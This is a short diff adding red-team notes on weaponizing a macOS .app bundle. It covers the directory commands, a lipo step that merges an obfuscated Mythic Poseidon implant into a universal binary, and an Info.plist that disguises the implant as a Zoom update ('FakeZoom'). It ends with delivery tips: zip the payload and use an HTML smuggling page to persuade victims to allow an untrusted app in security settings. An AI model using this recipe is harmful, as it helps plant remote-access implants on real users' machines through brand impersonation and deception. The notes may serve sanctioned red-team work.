@@ -1,1 +1,62 @@
+### Weaponize .APP
 
+AppName.app/  
+	Contents/  
+		Info.plist # App config info  
+		MacOS/ # Contains the app's executable file  
+		Resources/ # Fonts, images, sounds, icons, etc.
+
+First application bundle structure needs to be created
+```
+mkdir ZoomUpdate.app  
+mkdir ZoomUpdate.app/Contents  
+touch ZoomUpdate.app/Contents/Info.plist  
+mkdir ZoomUpdate.app/Contents/MacOS  
+mkdir ZoomUpdate.app/Contents/Resources
+```
+
+Generate implant for both platforms (or cut down on implant size and do only ARM)
+
+Generate with Mythic GUI
+generated both architectures, static linking broke compile, garble used
+
+```
+lipo -create arm-payload amd-payload -output universal-payload
+```
+
+
+```
+chmod +x poseidon-universal
+```
+
+Populate Info.plist
+```
+<?xml version="1.0" encoding="UTF-8"?>  
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">  
+<plist version="1.0">  
+<dict>  
+ <key>CFBundleExecutable</key>  
+ <string>PoseidonPayload</string>  
+ <key>CFBundleIconFile</key>  
+ <string>ZoomImageForPayload</string>  
+ <key>CFBundleIdentifier</key>  
+ <string>com.examplepayload.Zoom</string>  
+ <key>CFBundleName</key>  
+ <string>FakeZoom</string>  
+ <key>CFBundleVersion</key>  
+ <string>1.0.0</string>  
+</dict>  
+</plist>
+```
+
+
+CFBundleExecutable — The name of the main executable within the MacOS directory (PoseidonPayload)
+CFBundleIconFile — The name of the application image (ZoomImageForUpdate)
+CFBundleIdentifier — The string which unique identifies your application on the system (com.examplepayload.Zoom)
+CFBundleName — The name of your app (FakeZoom)
+CFBundleVersion — The build version number of your app (1.0.0)
+
+
+Resulting payload 21.2 mb, best zipped up, autounzips to drive
+restricted from executing unless user allows via settings>security untrusted app allow (con)
+need to be enticed to do this via html smuggling page with instructions
